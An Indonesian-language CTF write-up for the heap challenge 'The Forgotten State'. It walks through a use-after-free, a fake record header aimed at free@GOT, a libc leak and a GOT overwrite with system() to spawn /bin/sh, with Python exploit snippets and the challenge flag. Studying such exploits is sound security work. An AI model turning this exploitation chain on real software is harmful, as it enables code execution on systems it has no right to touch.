# THE FORGOTTEN STATE — Write-up

## Challenge Information
- **Event:** NFX CTF 2026
- **Category:** Pwn / Heap Exploitation
- **Difficulty:** Hard
- **Points:** 360
- **Target dari riwayat pengerjaan:** `s1.nfx.my.id:48645`
- **Status:** Solved (profil; sesi remote juga menghasilkan flag)

## Description

Aku dapat sebuah service pengelola record dengan operasi create, release, view, dan edit. Target aku adalah memperoleh eksekusi perintah melalui kesalahan pengelolaan heap, lalu membaca flag challenge.

## Analysis

Aku mulai dari menu `create`, `release`, `view`, dan `edit` di binary `state`. Pas aku cek `release()`, ternyata memorinya sudah di-free tapi pointer record-nya masih disimpan di tabel. Artinya, indeks lama masih bisa dipakai lagi. Dari situ aku tahu ada celah **use-after-free (UAF)**.

Terus aku memanfaatkan allocator untuk mendaur ulang area heap lama sebagai header record baru. Jika aku bisa mengendalikan header palsu tersebut, aku bisa mengarahkan operasi read/write ke alamat lain.

## Solution

### 1. Menyiapkan record dan mengosongkannya
Dalam solver aku membuat dua record dengan isi berbeda, lalu melepas keduanya:

~~~python
create(io, 0, b"AAAA", 0x40, b"A" * 0x40)
create(io, 1, b"BBBB", 0x40, b"B" * 0x40)
release(io, 0)
release(io, 1)
~~~

Tabel lama masih menyimpan pointer dangling.

### 2. Memalsukan header record
Aku membuat record lain agar alokasi baru menggunakan ulang chunk yang telah di-free. Payload header palsu diarahkan ke entri GOT fungsi `free`:

~~~python
import struct

FREE_GOT = 0x404000
fake_header = struct.pack("<16sIIQ", b"FAKE", 8, 1, FREE_GOT)
create(io, 2, b"CONTROL", len(fake_header), fake_header)
~~~

Overlap ini memberi aku primitive pembacaan dan penulisan ke alamat yang aku pilih melalui pointer record lama.

### 3. Membocorkan libc dan mencari `system`
Dari `view(io, 0, 8)` aku membaca alamat runtime `free()` pada GOT. Offset dalam libc yang disertakan challenge:

~~~python
FREE_LIBC_OFFSET = 0xB5360
SYSTEM_LIBC_OFFSET = 0x5C2E0

free_address = u64(view(io, 0, 8))
libc_base = free_address - FREE_LIBC_OFFSET
system_address = libc_base + SYSTEM_LIBC_OFFSET
~~~

Aku juga mengecek kesesuaian bagian bawah offset leak agar tidak menghitung base dari pointer yang keliru.

### 4. Menimpa `free@GOT` dengan `system`
Setelah alamat `system` didapat, aku memakai primitive write:

~~~python
edit(io, 0, struct.pack("<Q", system_address))
~~~

Aku membuat record berisi string `/bin/sh` dan memanggil release pada indeksnya. Dengan demikian, pemanggilan yang semula menuju `free(data)` dialihkan ke `system(data)`.

~~~python
create(io, 3, b"SHELL", 0x20, b"/bin/sh\x00".ljust(0x20, b"X"))
release(io, 3)  # Pemicu konseptual; solver mengirim protokol menu secara eksplisit.
~~~

### 5. Membaca flag di server
Aku menjalankan solver remote yang telah aku siapkan:

~~~bash
python solve_forgotten_state.py --remote
~~~

Log remote menunjukkan eksekusi shell dan pencarian file. File challenge ditemukan pada:

~~~text
/app/flag.txt
~~~

Flag yang tercatat dalam output remote:

~~~text
NFX{ElC0nloe_Forg0tten_StaticcD42#}
~~~

Script lengkap hasil pengerjaan sebelumnya aku sertakan di [`scripts/solve_forgotten_state.py`](../scripts/solve_forgotten_state.py). Jalur loader dan binary dalam script membutuhkan bundle challenge asli pada folder `peserta/`.

## Flag

~~~text
NFX{ElC0nloe_Forg0tten_StaticcD42#}
~~~

## Conclusion

Celahnya ada di pointer yang masih bisa diakses sesudah `free()`. Aku pakai overlap chunk untuk bikin header palsu, bocorin alamat `free()` di libc, lalu ganti alamatnya jadi `system()`. Waktu record berisi `/bin/sh` aku release, shell berhasil terpanggil dan aku bisa baca flag.
